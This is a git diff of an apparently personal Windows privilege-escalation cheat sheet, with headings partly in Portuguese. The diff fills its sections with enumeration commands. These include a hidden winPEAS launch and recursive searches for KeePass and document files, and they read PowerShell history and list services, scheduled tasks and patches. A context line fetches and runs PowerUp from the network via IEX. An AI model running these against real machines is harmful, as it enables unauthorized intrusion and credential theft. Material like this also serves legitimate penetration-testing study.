@@ -46,6 +46,8 @@ wmic process call create "cmd.exe /c C:\temp\winpeas.exe > C:\temp\winpeas.txt"
 >powershell
 ```powershell
 Start-Process -FilePath "C:\temp\winpeas.exe" -ArgumentList " > C:\temp\output.txt" -WindowStyle Hidden -NoNewWindow
+
+Start-Process -FilePath "C:\temp\winpeas.exe" -RedirectStandardOutput "C:\temp\winpeas.txt" -WindowStyle Hidden
 ```
 
 ### Powerup
@@ -56,55 +58,59 @@ powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('
 # Enumeration for (USERNAME)
 ## hostname and username
 ```js
-
+whoami
+hostname
 
 ```
 
 ## User Privileges
-```
-
+```js
+whoami /priv
 
 ```
 
 ## Group memberships
 ```js
 
-
+whoami /groups
 
 ```
 
 ## Sensitive Files By User and Group
+```js
+Get-ChildItem -Path C:\ -Include *.kdbx,*.txt -File -Recurse -ErrorAction SilentlyContinue
 ```
 
-```
-
-```
-
+```js
+Get-ChildItem -Path C:\users -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini -File -Recurse -ErrorAction SilentlyContinue
 ```
 
 ## Powershell History and Transcript
 ```js
+Get-History
 
+type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 
+cat (Get-PSReadlineOption).HistorySavePath
 ```
 
 ## Powershell Env Variables
 ```js
-
-
+Get-ChildItem Env: | ft Key,Value
 ```
 
 ## Find-LocalAdmins
-```
-
+```js
+Find-LocalAdmins
 ```
 
 ## Services Running
 - Procura serviços que utilizam executaveis cujo temos permissões de acesso
 - Procurar por serviços que estão em diretórios cujo temos permissões de acesso.
 - utilizar PowerUp.ps1 para automatizar processo e fazer método manual.
-```
-
+```js
+net start
+sc query
 ```
 
 ## Schedule Tasks
@@ -112,8 +118,12 @@ powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('
 - Procurar por tasks cujo o binário temos permissões de acesso
 - Procurar por tasks cujo o binário está num diretório que temos permissão
 - Usar powerup.ps1 para automatizar
-```
+```js
+schtasks /query /fo LIST 2>nul | findstr TaskName
 
+schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
+
+Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
 ```
 
 
@@ -123,55 +133,50 @@ powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('
 
 ### Users
 ```js
-
-
-
-
-
+net user
 ```
 
 ### Groups
 ```js
-
-
+net localgroup
+Get-LocalGroup
 ```
 
 ## System SO, info, version, arch
 ```js
-
-
-
+systeminfo
 ```
 
 ## Security Patches installed
 ```js
-
+Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }
 
 ```
 
 ## Network Information
 ```js
-
+ipconfig /all
 
 ```
 
 ```js
+route print
 
 ```
 ## Installed Applications
 #### Apps x86
 ```js
-
+Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
 ```
 #### Apps x64
 ```js
-   
+Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
 
 ```
 
 ## Running Process
 ```js
-
+Get-Process
 ```
 
 ## DLL Hijacking
